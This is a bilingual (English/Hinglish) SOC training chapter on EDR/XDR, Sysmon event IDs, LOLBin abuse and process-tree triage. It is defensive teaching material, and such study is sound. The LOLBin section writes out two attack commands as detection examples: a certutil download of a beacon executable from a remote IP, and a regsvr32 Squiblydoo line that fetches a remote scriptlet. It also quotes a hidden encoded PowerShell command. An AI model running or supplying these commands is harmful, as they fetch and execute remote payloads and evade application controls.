# Day 11 — Endpoint Detection & Response (EDR / XDR) & Microsoft Sysmon Deep Dive

> **What you'll learn / Is chapter mein:** Investigate endpoint alerts using EDR/XDR context, Sysmon telemetry, process trees and LOLBin behaviour.
>
> **Seedhi baat:** Windows ke legitimate tools ka misuse tricky hota hai—sirf filename dekhkar verdict mat do; parent-child relation, command line, user aur network context correlate karo.

**Course focus:** Host Telemetry, EDR Containment, Sysmon Event IDs & Living-off-the-Land (LOLBins)

> **Study note:** Core content is based on the supplied text notes. Formatting and explanatory context have been edited for readability. Commands, thresholds and detection examples are illustrative; validate them in an authorized lab and against your own data schema before operational use.

---

> **Safe-lab note:** The following LOLBin strings are included as detection artifacts, not commands to execute on a real workstation. Keep any behavior reproduction inside a disposable, isolated lab with explicit authorization.

## 1. Evolution: Antivirus (AV) vs. EDR vs. XDR

Traditional security solutions modern stealthy attacks ko detect karne mein fail ho jaate hain kyunki attackers bina kisi malware file ke built-in administrative tools use karte hain.

```
[ 1st Gen: Legacy Antivirus (AV) ]
- Pure Signature-Based (MD5/SHA256 matching).
- Periodic disk scans; blind to memory-only & fileless attacks.
             │
             ▼
[ 2nd Gen: Endpoint Detection & Response (EDR) ]
- Continuous behavioral telemetry (Process trees, parent-child links, memory injection).
- Active Containment: Network isolation, live response shell, process termination.
             │
             ▼
[ 3rd Gen: Extended Detection & Response (XDR) ]
- Correlates Endpoint + Network + Identity (AD/Okta) + Cloud telemetry in a single pane.

```

### Core Capabilities of an EDR Agent (CrowdStrike, Defender for Endpoint, SentinelOne)

1. **Continuous Telemetry Streaming:** Har single process start, registry change, network handshake, aur file write ko record karke cloud console par stream karna.
2. **Behavioral Heuristics & ML:** Signature matching ki jagah malicious intent identify karna (e.g., Office application running PowerShell with Base64 commands).
3. **Endpoint Containment (Host Isolation):** Analyst ek single click par infected machine ko network se cut-off (quarantine) kar sakta hai, jabki EDR agent ka control server communication maintain rehta hai investigation ke liye.
4. **Live Response Console:** Remote interactive terminal session open karke live artifacts inspect karna, processes kill karna, aur memory dump download karna.

---

## 2. Microsoft System Monitor (Sysmon) Fundamentals

Windows ke default Security Event Logs mein critical process execution details (jaise exact command-line arguments, parent process relationship, process integrity level, aur cryptographic file hashes) record nahi hote.

**Sysmon** ek free Microsoft Sysinternals utility hai jo system service aur device driver ke roop mein install hoti hai aur standard Windows Event Viewer (`Applications and Services Logs/Microsoft/Windows/Sysmon/Operational`) mein high-fidelity security telemetry generate karti hai.

---

## 3. High-Priority Sysmon Event IDs Every SOC Analyst Must Know

```
┌────────────────────────────────────────────────────────────────────────┐
│ Critical Sysmon Event Matrix                                           │
├──────────┬─────────────────────────────┬───────────────────────────────┤
│ Event ID │ Event Name                  │ Primary Detection Objective   │
├──────────┼─────────────────────────────┼───────────────────────────────┤
│ ID 1     │ Process Creation            │ Command lines, Parent PIDs    │
│ ID 3     │ Network Connection          │ Process-to-IP binding         │
│ ID 7     │ Image Loaded (DLLs)         │ DLL Hijacking / Sideloading   │
│ ID 8     │ CreateRemoteThread          │ Process Injection (Mimikatz)  │
│ ID 10    │ ProcessAccess               │ LSASS memory dumping          │
│ ID 11    │ FileCreate                  │ Dropped payloads, Ransomware  │
│ ID 12/13 │ Registry Create / Set       │ Persistence Autorun keys      │
│ ID 22    │ DNSEvent (DNS Query)        │ Malicious C2 domains by apps  │
└──────────┴─────────────────────────────┴───────────────────────────────┘

```

### Deep Dive into Key Sysmon Events

#### Sysmon Event ID 1: Process Creation (The King of Telemetry)

Record karta hai jab bhi koi process spawn hoti hai:

* `Image`: Full path of executable (e.g., `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`).
* `CommandLine`: Exact arguments executed (e.g., `powershell.exe -nop -w hidden -enc JAB...`).
* `ParentImage`: Executable jisne is process ko start kiya (e.g., `C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE`).
* *Critical Rule:* Agar Parent Image koi document app ya browser hai aur Child Process `cmd.exe` ya `powershell.exe` hai, toh ye high-confidence malicious activity hai.

* `Hashes`: Automatic MD5, SHA256 hashes generated for the binary.

#### Sysmon Event ID 8: CreateRemoteThread (Process Injection)

* Ek process kisi doosri legitimate process ke memory space mein thread inject karti hai (e.g., malware injecting code into `explorer.exe` ya `svchost.exe`).
* Used by attackers to hide inside benign system processes to bypass security tooling.

#### Sysmon Event ID 10: ProcessAccess (Credential Dumping Detection)

* Track karta hai jab ek process doosri process ke virtual memory ko open karti hai with specific memory read permissions.
* *Classic Indicator:* Jab koi non-system process (`mimikatz.exe`, `procdump.exe`, ya custom binary) `lsass.exe` (Local Security Authority Subsystem Service) ko access karti hai with `GrantedAccess=0x1010` ya `0x1FFFFF` memory read rights.

---

## 4. LOLBins (Living off the Land Binaries) & Triage

Modern attackers antivirus bypass karne ke liye external tools download nahi karte. Wo Windows OS mein already pre-installed legitimate administrative executables (LOLBins) ko malicious purposes ke liye weaponize karte hain.

```
[ Common LOLBins & Abuse Patterns ]
├── certutil.exe  ──► Legitimate certificate tool; abused to download external payloads.
├── bitsadmin.exe ──► Windows background transfer utility; abused to download malware.
├── mshta.exe     ──► Executes HTML applications; abused to run remote malicious scripts.
├── regsvr32.exe  ──► Registers DLLs; abused to run remote scripts bypassing AppLocker (Squiblydoo).
└── wmic.exe      ──► Windows Management Instrumentation; abused for internal system discovery.

```

### LOLBin Command Examples Analyzed by SOC

1. **Payload Download via `certutil`:**
```cmd
certutil.exe -urlcache -split -f "http://198.51.100.20/beacon.exe" C:\Users\Public\beacon.exe

```

* *SOC Detection:* Alert on `certutil.exe` process executing with `-urlcache` or `-split` flags.

2. **AppLocker Bypass via `regsvr32` (Squiblydoo Technique):**
```cmd
regsvr32.exe /s /n /u /i:http://example.invalid/payload.sct scrobj.dll

```

* *SOC Detection:* `regsvr32.exe` making outbound network connections or loading `scrobj.dll` with an HTTP/HTTPS URL argument.

---

## 5. High-Yield Interview Q&A (Day 11 Focus)

**Q1: What is the significance of the Parent-Child process relationship in threat detection? Give two examples of anomalous relationships.**

* **Answer:**
* **Significance:** Operating systems have well-defined, predictable process hierarchies. Benign applications rarely spawn system command interpreters. Observing an abnormal parent process helps identify exploitation immediately even without knowing the file hash.
* **Anomalous Examples:**
1. `winword.exe` or `excel.exe` spawning `powershell.exe` or `cmd.exe` (Indicates malicious macro exploitation).
2. `w3wp.exe` (IIS Web Server worker process) spawning `cmd.exe` or `powershell.exe` (Indicates a Web Shell execution post web server compromise).

---

---

---

## Analyst takeaway / Yaad rakhne wali baat

Suspicious parent-child relation ek strong clue ho sakta hai, lekin management agents and admin scripts ko benign alternatives ke roop mein test karo.

## Practice prompt / Khud try karo

Ek synthetic process tree banao, 3 suspicious relationships mark karo, aur har one ke liye ek benign explanation aur next telemetry pivot likho.
